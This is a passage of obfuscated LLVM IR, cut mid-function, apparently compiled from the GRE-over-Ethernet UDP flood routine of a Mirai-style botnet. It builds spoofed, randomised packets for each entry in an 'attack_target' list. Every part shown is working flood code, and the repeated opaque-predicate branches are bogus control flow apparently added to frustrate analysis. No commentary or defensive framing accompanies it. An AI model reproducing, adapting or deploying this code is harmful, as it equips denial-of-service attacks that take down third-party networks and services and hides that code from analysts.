  %102 = load i32, i32* @y.22
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %100
  %109 = load i32, i32* %12, align 4
  %110 = call i32 @close(i32 %109)
  %111 = load i32, i32* @x.21
  %112 = load i32, i32* @y.22
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %698

; <label>:119:                                    ; preds = %95
  store i32 0, i32* %11, align 4
  br label %120

; <label>:120:                                    ; preds = %324, %119
  %121 = load i32, i32* %11, align 4
  %122 = load i8, i8* %7, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %121, %123
  br i1 %124, label %125, label %327

; <label>:125:                                    ; preds = %120
  %126 = load i32, i32* @x.21
  %127 = load i32, i32* @y.22
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %125
  %134 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %135 = load i8**, i8*** %13, align 8
  %136 = load i32, i32* %11, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8*, i8** %135, i64 %137
  store i8* %134, i8** %138, align 8
  %139 = load i8**, i8*** %13, align 8
  %140 = load i32, i32* %11, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8*, i8** %139, i64 %141
  %143 = load i8*, i8** %142, align 8
  %144 = bitcast i8* %143 to %struct.iphdr*
  store %struct.iphdr* %144, %struct.iphdr** %25, align 8
  %145 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i64 1
  %147 = bitcast %struct.iphdr* %146 to %struct.grehdr*
  store %struct.grehdr* %147, %struct.grehdr** %26, align 8
  %148 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %149 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %148, i64 1
  %150 = bitcast %struct.grehdr* %149 to %struct.ethhdr*
  store %struct.ethhdr* %150, %struct.ethhdr** %27, align 8
  %151 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %152 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %151, i64 1
  %153 = bitcast %struct.ethhdr* %152 to %struct.iphdr*
  store %struct.iphdr* %153, %struct.iphdr** %28, align 8
  %154 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i64 1
  %156 = bitcast %struct.iphdr* %155 to %struct.udphdr*
  store %struct.udphdr* %156, %struct.udphdr** %29, align 8
  %157 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %158 = bitcast %struct.iphdr* %157 to i8*
  %159 = load i8, i8* %158, align 4
  %160 = and i8 %159, 15
  %161 = or i8 %160, 64
  store i8 %161, i8* %158, align 4
  %162 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %163 = bitcast %struct.iphdr* %162 to i8*
  %164 = load i8, i8* %163, align 4
  %165 = and i8 %164, -16
  %166 = or i8 %165, 5
  store i8 %166, i8* %163, align 4
  %167 = load i8, i8* %14, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 1
  store i8 %167, i8* %169, align 1
  %170 = load i32, i32* %20, align 4
  %171 = sext i32 %170 to i64
  %172 = add i64 66, %171
  %173 = trunc i64 %172 to i16
  %174 = call zeroext i16 @htons(i16 zeroext %173) #7
  %175 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 2
  store i16 %174, i16* %176, align 2
  %177 = load i16, i16* %15, align 2
  %178 = call zeroext i16 @htons(i16 zeroext %177) #7
  %179 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 3
  store i16 %178, i16* %180, align 4
  %181 = load i8, i8* %16, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 5
  store i8 %181, i8* %183, align 4
  %184 = load i8, i8* %17, align 1
  %185 = icmp ne i8 %184, 0
  %186 = load i32, i32* @x.21
  %187 = load i32, i32* @y.22
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart228, label %originalBB1alteredBB

originalBBpart228:                                ; preds = %originalBB1
  br i1 %185, label %194, label %198

; <label>:194:                                    ; preds = %originalBBpart228
  %195 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %196 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 4
  store i16 %195, i16* %197, align 2
  br label %198

; <label>:198:                                    ; preds = %194, %originalBBpart228
  %199 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 6
  store i8 47, i8* %200, align 1
  %201 = load i32, i32* %23, align 4
  %202 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 8
  store i32 %201, i32* %203, align 4
  %204 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %205 = load i32, i32* %11, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i64 %206
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i32 0, i32 1
  %209 = load i32, i32* %208, align 4
  %210 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 9
  store i32 %209, i32* %211, align 4
  %212 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %213 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %214 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %213, i32 0, i32 1
  store i16 %212, i16* %214, align 2
  %215 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %216 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %217 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %216, i32 0, i32 2
  store i16 %215, i16* %217, align 1
  %218 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %219 = bitcast %struct.iphdr* %218 to i8*
  %220 = load i8, i8* %219, align 4
  %221 = and i8 %220, 15
  %222 = or i8 %221, 64
  store i8 %222, i8* %219, align 4
  %223 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %224 = bitcast %struct.iphdr* %223 to i8*
  %225 = load i8, i8* %224, align 4
  %226 = and i8 %225, -16
  %227 = or i8 %226, 5
  store i8 %227, i8* %224, align 4
  %228 = load i8, i8* %14, align 1
  %229 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i32 0, i32 1
  store i8 %228, i8* %230, align 1
  %231 = load i32, i32* %20, align 4
  %232 = sext i32 %231 to i64
  %233 = add i64 28, %232
  %234 = trunc i64 %233 to i16
  %235 = call zeroext i16 @htons(i16 zeroext %234) #7
  %236 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i32 0, i32 2
  store i16 %235, i16* %237, align 2
  %238 = load i16, i16* %15, align 2
  %239 = zext i16 %238 to i32
  %240 = xor i32 %239, -1
  %241 = trunc i32 %240 to i16
  %242 = call zeroext i16 @htons(i16 zeroext %241) #7
  %243 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %244 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %243, i32 0, i32 3
  store i16 %242, i16* %244, align 4
  %245 = load i8, i8* %16, align 1
  %246 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %247 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %246, i32 0, i32 5
  store i8 %245, i8* %247, align 4
  %248 = load i8, i8* %17, align 1
  %249 = icmp ne i8 %248, 0
  br i1 %249, label %250, label %254

; <label>:250:                                    ; preds = %198
  %251 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %252 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 4
  store i16 %251, i16* %253, align 2
  br label %254

; <label>:254:                                    ; preds = %250, %198
  %255 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %256 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %255, i32 0, i32 6
  store i8 17, i8* %256, align 1
  %257 = call i32 @rand_next()
  %258 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %259 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %258, i32 0, i32 8
  store i32 %257, i32* %259, align 4
  %260 = load i8, i8* %22, align 1
  %261 = icmp ne i8 %260, 0
  br i1 %261, label %262, label %284

; <label>:262:                                    ; preds = %254
  %263 = load i32, i32* @x.21
  %264 = load i32, i32* @y.22
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %262
  %271 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 9
  %273 = load i32, i32* %272, align 4
  %274 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 9
  store i32 %273, i32* %275, align 4
  %276 = load i32, i32* @x.21
  %277 = load i32, i32* @y.22
  %278 = sub i32 %276, 1
  %279 = mul i32 %276, %278
  %280 = urem i32 %279, 2
  %281 = icmp eq i32 %280, 0
  %282 = icmp slt i32 %277, 10
  %283 = or i1 %281, %282
  br i1 %283, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %308

; <label>:284:                                    ; preds = %254
  %285 = load i32, i32* @x.21
  %286 = load i32, i32* @y.22
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %284
  %293 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %294 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %293, i32 0, i32 8
  %295 = load i32, i32* %294, align 4
  %296 = sub i32 %295, 1024
  %297 = xor i32 %296, -1
  %298 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %299 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %298, i32 0, i32 9
  store i32 %297, i32* %299, align 4
  %300 = load i32, i32* @x.21
  %301 = load i32, i32* @y.22
  %302 = sub i32 %300, 1
  %303 = mul i32 %300, %302
  %304 = urem i32 %303, 2
  %305 = icmp eq i32 %304, 0
  %306 = icmp slt i32 %301, 10
  %307 = or i1 %305, %306
  br i1 %307, label %originalBBpart238, label %originalBB34alteredBB

originalBBpart238:                                ; preds = %originalBB34
  br label %308

; <label>:308:                                    ; preds = %originalBBpart238, %originalBBpart232
  %309 = load i16, i16* %18, align 2
  %310 = call zeroext i16 @htons(i16 zeroext %309) #7
  %311 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %312 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %311, i32 0, i32 0
  store i16 %310, i16* %312, align 2
  %313 = load i16, i16* %19, align 2
  %314 = call zeroext i16 @htons(i16 zeroext %313) #7
  %315 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %316 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %315, i32 0, i32 1
  store i16 %314, i16* %316, align 2
  %317 = load i32, i32* %20, align 4
  %318 = sext i32 %317 to i64
  %319 = add i64 8, %318
  %320 = trunc i64 %319 to i16
  %321 = call zeroext i16 @htons(i16 zeroext %320) #7
  %322 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %323 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %322, i32 0, i32 2
  store i16 %321, i16* %323, align 2
  br label %324

; <label>:324:                                    ; preds = %308
  %325 = load i32, i32* %11, align 4
  %326 = add nsw i32 %325, 1
  store i32 %326, i32* %11, align 4
  br label %120

; <label>:327:                                    ; preds = %120
  %328 = load i32, i32* @x.21
  %329 = load i32, i32* @y.22
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %327
  %336 = load i32, i32* @x.21
  %337 = load i32, i32* @y.22
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br label %344

; <label>:344:                                    ; preds = %697, %originalBBpart242
  %345 = load i32, i32* @x.21
  %346 = load i32, i32* @y.22
  %347 = sub i32 %345, 1
  %348 = mul i32 %345, %347
  %349 = urem i32 %348, 2
  %350 = icmp eq i32 %349, 0
  %351 = icmp slt i32 %346, 10
  %352 = or i1 %350, %351
  br i1 %352, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %344
  store i32 0, i32* %11, align 4
  %353 = load i32, i32* @x.21
  %354 = load i32, i32* @y.22
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %361

; <label>:361:                                    ; preds = %656, %originalBBpart246
  %362 = load i32, i32* %11, align 4
  %363 = load i8, i8* %7, align 1
  %364 = zext i8 %363 to i32
  %365 = icmp slt i32 %362, %364
  br i1 %365, label %366, label %659

; <label>:366:                                    ; preds = %361
  %367 = load i8**, i8*** %13, align 8
  %368 = load i32, i32* %11, align 4
  %369 = sext i32 %368 to i64
  %370 = getelementptr inbounds i8*, i8** %367, i64 %369
  %371 = load i8*, i8** %370, align 8
  store i8* %371, i8** %33, align 8
  %372 = load i8*, i8** %33, align 8
  %373 = bitcast i8* %372 to %struct.iphdr*
  store %struct.iphdr* %373, %struct.iphdr** %34, align 8
  %374 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %375 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %374, i64 1
  %376 = bitcast %struct.iphdr* %375 to %struct.grehdr*
  store %struct.grehdr* %376, %struct.grehdr** %35, align 8
  %377 = load %struct.grehdr*, %struct.grehdr** %35, align 8
  %378 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %377, i64 1
  %379 = bitcast %struct.grehdr* %378 to %struct.ethhdr*
  store %struct.ethhdr* %379, %struct.ethhdr** %36, align 8
  %380 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %381 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %380, i64 1
  %382 = bitcast %struct.ethhdr* %381 to %struct.iphdr*
  store %struct.iphdr* %382, %struct.iphdr** %37, align 8
  %383 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %384 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %383, i64 1
  %385 = bitcast %struct.iphdr* %384 to %struct.udphdr*
  store %struct.udphdr* %385, %struct.udphdr** %38, align 8
  %386 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %387 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %386, i64 1
  %388 = bitcast %struct.udphdr* %387 to i8*
  store i8* %388, i8** %39, align 8
  %389 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %390 = load i32, i32* %11, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %389, i64 %391
  %393 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %392, i32 0, i32 2
  %394 = load i8, i8* %393, align 4
  %395 = zext i8 %394 to i32
  %396 = icmp slt i32 %395, 32
  br i1 %396, label %397, label %434

; <label>:397:                                    ; preds = %366
  %398 = load i32, i32* @x.21
  %399 = load i32, i32* @y.22
  %400 = sub i32 %398, 1
  %401 = mul i32 %398, %400
  %402 = urem i32 %401, 2
  %403 = icmp eq i32 %402, 0
  %404 = icmp slt i32 %399, 10
  %405 = or i1 %403, %404
  br i1 %405, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %397
  %406 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %407 = load i32, i32* %11, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i64 %408
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %409, i32 0, i32 1
  %411 = load i32, i32* %410, align 4
  %412 = call i32 @ntohl(i32 %411) #7
  %413 = call i32 @rand_next()
  %414 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %415 = load i32, i32* %11, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %414, i64 %416
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %417, i32 0, i32 2
  %419 = load i8, i8* %418, align 4
  %420 = zext i8 %419 to i32
  %421 = lshr i32 %413, %420
  %422 = add i32 %412, %421
  %423 = call i32 @htonl(i32 %422) #7
  %424 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %425 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %424, i32 0, i32 9
  store i32 %423, i32* %425, align 4
  %426 = load i32, i32* @x.21
  %427 = load i32, i32* @y.22
  %428 = sub i32 %426, 1
  %429 = mul i32 %426, %428
  %430 = urem i32 %429, 2
  %431 = icmp eq i32 %430, 0
  %432 = icmp slt i32 %427, 10
  %433 = or i1 %431, %432
  br i1 %433, label %originalBBpart265, label %originalBB48alteredBB

originalBBpart265:                                ; preds = %originalBB48
  br label %434

; <label>:434:                                    ; preds = %originalBBpart265, %366
  %435 = load i32, i32* %23, align 4
  %436 = icmp eq i32 %435, -1
  br i1 %436, label %437, label %441

; <label>:437:                                    ; preds = %434
  %438 = call i32 @rand_next()
  %439 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %440 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %439, i32 0, i32 8
  store i32 %438, i32* %440, align 4
  br label %441

; <label>:441:                                    ; preds = %437, %434
  %442 = load i32, i32* @x.21
  %443 = load i32, i32* @y.22
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %441
  %450 = load i16, i16* %15, align 2
  %451 = zext i16 %450 to i32
  %452 = icmp eq i32 %451, 65535
  %453 = load i32, i32* @x.21
  %454 = load i32, i32* @y.22
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br i1 %452, label %461, label %492

; <label>:461:                                    ; preds = %originalBBpart269
  %462 = load i32, i32* @x.21
  %463 = load i32, i32* @y.22
  %464 = sub i32 %462, 1
  %465 = mul i32 %462, %464
  %466 = urem i32 %465, 2
  %467 = icmp eq i32 %466, 0
  %468 = icmp slt i32 %463, 10
  %469 = or i1 %467, %468
  br i1 %469, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %461
  %470 = call i32 @rand_next()
  %471 = and i32 %470, 65535
  %472 = trunc i32 %471 to i16
  %473 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %474 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %473, i32 0, i32 3
  store i16 %472, i16* %474, align 4
  %475 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %476 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %475, i32 0, i32 3
  %477 = load i16, i16* %476, align 4
  %478 = zext i16 %477 to i32
  %479 = sub nsw i32 %478, 1000
  %480 = xor i32 %479, -1
  %481 = trunc i32 %480 to i16
  %482 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %483 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %482, i32 0, i32 3
  store i16 %481, i16* %483, align 4
  %484 = load i32, i32* @x.21
  %485 = load i32, i32* @y.22
  %486 = sub i32 %484, 1
  %487 = mul i32 %484, %486
  %488 = urem i32 %487, 2
  %489 = icmp eq i32 %488, 0
  %490 = icmp slt i32 %485, 10
  %491 = or i1 %489, %490
  br i1 %491, label %originalBBpart286, label %originalBB71alteredBB

originalBBpart286:                                ; preds = %originalBB71
  br label %492

; <label>:492:                                    ; preds = %originalBBpart286, %originalBBpart269
  %493 = load i16, i16* %18, align 2
  %494 = zext i16 %493 to i32
  %495 = icmp eq i32 %494, 65535
  br i1 %495, label %496, label %502

; <label>:496:                                    ; preds = %492
  %497 = call i32 @rand_next()
  %498 = and i32 %497, 65535
  %499 = trunc i32 %498 to i16
  %500 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %501 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %500, i32 0, i32 0
  store i16 %499, i16* %501, align 2
  br label %502

; <label>:502:                                    ; preds = %496, %492
  %503 = load i32, i32* @x.21
  %504 = load i32, i32* @y.22
  %505 = sub i32 %503, 1
  %506 = mul i32 %503, %505
  %507 = urem i32 %506, 2
  %508 = icmp eq i32 %507, 0
  %509 = icmp slt i32 %504, 10
  %510 = or i1 %508, %509
  br i1 %510, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %502
  %511 = load i16, i16* %19, align 2
  %512 = zext i16 %511 to i32
  %513 = icmp eq i32 %512, 65535
  %514 = load i32, i32* @x.21
  %515 = load i32, i32* @y.22
  %516 = sub i32 %514, 1
  %517 = mul i32 %514, %516
  %518 = urem i32 %517, 2
  %519 = icmp eq i32 %518, 0
  %520 = icmp slt i32 %515, 10
  %521 = or i1 %519, %520
  br i1 %521, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br i1 %513, label %522, label %544

; <label>:522:                                    ; preds = %originalBBpart290
  %523 = load i32, i32* @x.21
  %524 = load i32, i32* @y.22
  %525 = sub i32 %523, 1
  %526 = mul i32 %523, %525
  %527 = urem i32 %526, 2
  %528 = icmp eq i32 %527, 0
  %529 = icmp slt i32 %524, 10
  %530 = or i1 %528, %529
  br i1 %530, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %522
  %531 = call i32 @rand_next()
  %532 = and i32 %531, 65535
  %533 = trunc i32 %532 to i16
  %534 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %535 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %534, i32 0, i32 1
  store i16 %533, i16* %535, align 2
  %536 = load i32, i32* @x.21
  %537 = load i32, i32* @y.22
  %538 = sub i32 %536, 1
  %539 = mul i32 %536, %538
  %540 = urem i32 %539, 2
  %541 = icmp eq i32 %540, 0
  %542 = icmp slt i32 %537, 10
  %543 = or i1 %541, %542
  br i1 %543, label %originalBBpart299, label %originalBB92alteredBB

originalBBpart299:                                ; preds = %originalBB92
  br label %544

; <label>:544:                                    ; preds = %originalBBpart299, %originalBBpart290
  %545 = load i8, i8* %22, align 1
  %546 = icmp ne i8 %545, 0
  br i1 %546, label %551, label %547

; <label>:547:                                    ; preds = %544
  %548 = call i32 @rand_next()
  %549 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %550 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %549, i32 0, i32 9
  store i32 %548, i32* %550, align 4
  br label %557

; <label>:551:                                    ; preds = %544
  %552 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %553 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %552, i32 0, i32 9
  %554 = load i32, i32* %553, align 4
  %555 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %556 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %555, i32 0, i32 9
  store i32 %554, i32* %556, align 4
  br label %557

; <label>:557:                                    ; preds = %551, %547
  %558 = call i32 @rand_next()
  store i32 %558, i32* %40, align 4
  %559 = call i32 @rand_next()
  store i32 %559, i32* %41, align 4
  %560 = call i32 @rand_next()
  store i32 %560, i32* %42, align 4
  %561 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %562 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %561, i32 0, i32 0
  %563 = getelementptr inbounds [6 x i8], [6 x i8]* %562, i32 0, i32 0
  %564 = bitcast i32* %40 to i8*
  call void @util_memcpy(i8* %563, i8* %564, i32 4)
  %565 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %566 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %565, i32 0, i32 1
  %567 = getelementptr inbounds [6 x i8], [6 x i8]* %566, i32 0, i32 0
  %568 = bitcast i32* %41 to i8*
  call void @util_memcpy(i8* %567, i8* %568, i32 4)
  %569 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %570 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %569, i32 0, i32 0
  %571 = getelementptr inbounds [6 x i8], [6 x i8]* %570, i32 0, i32 0
  %572 = getelementptr inbounds i8, i8* %571, i64 4
  %573 = bitcast i32* %42 to i8*
  call void @util_memcpy(i8* %572, i8* %573, i32 2)
  %574 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %575 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %574, i32 0, i32 1
  %576 = getelementptr inbounds [6 x i8], [6 x i8]* %575, i32 0, i32 0
  %577 = getelementptr inbounds i8, i8* %576, i64 4
  %578 = bitcast i32* %42 to i8*
  %579 = getelementptr inbounds i8, i8* %578, i64 2
  call void @util_memcpy(i8* %577, i8* %579, i32 2)
  %580 = load i8, i8* %21, align 1
  %581 = icmp ne i8 %580, 0
  br i1 %581, label %582, label %589

; <label>:582:                                    ; preds = %557
  %583 = load i8*, i8** %39, align 8
  %584 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %583, i32 %584)
  %585 = load i8*, i8** %39, align 8
  %586 = load i32, i32* %20, align 4
  %587 = sext i32 %586 to i64
  %588 = getelementptr inbounds i8, i8* %585, i64 %587
  store i8 0, i8* %588, align 1
  br label %589

; <label>:589:                                    ; preds = %582, %557
  %590 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %591 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %590, i32 0, i32 7
  store i16 0, i16* %591, align 2
  %592 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %593 = bitcast %struct.iphdr* %592 to i16*
  %594 = call zeroext i16 @checksum_generic(i16* %593, i32 20)
  %595 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %596 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %595, i32 0, i32 7
  store i16 %594, i16* %596, align 2
  %597 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %598 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %597, i32 0, i32 7
  store i16 0, i16* %598, align 2
  %599 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %600 = bitcast %struct.iphdr* %599 to i16*
  %601 = call zeroext i16 @checksum_generic(i16* %600, i32 20)
  %602 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %603 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %602, i32 0, i32 7
  store i16 %601, i16* %603, align 2
  %604 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %605 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %604, i32 0, i32 3
  store i16 0, i16* %605, align 2
  %606 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %607 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %608 = bitcast %struct.udphdr* %607 to i8*
  %609 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %610 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %609, i32 0, i32 2
